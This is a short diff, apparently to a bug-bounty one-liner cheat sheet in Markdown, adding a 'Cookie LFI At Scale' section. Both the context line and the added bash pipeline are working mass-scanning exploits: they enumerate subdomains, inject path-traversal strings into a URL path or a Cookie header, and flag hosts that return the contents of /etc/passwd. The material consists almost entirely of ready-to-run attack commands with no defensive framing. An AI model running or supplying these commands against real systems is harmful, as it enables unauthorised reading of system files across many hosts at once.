@@ -46,6 +46,12 @@
 	$ cat host | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -p "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt
 
 
+### Cookie LFI At Scale 🔥🔥🔥
+```bash
+cat rootDomains.txt | assetfinder -subs-only | httpx -t 60 -nc -p 80,443,8080,8443,9001,9002,9002,9003 -H "Cookie:usid=../../../../../../../../../../../../etc/passwd" -mc 200 -mr "root:x:"
+```
+
+
 
 
 
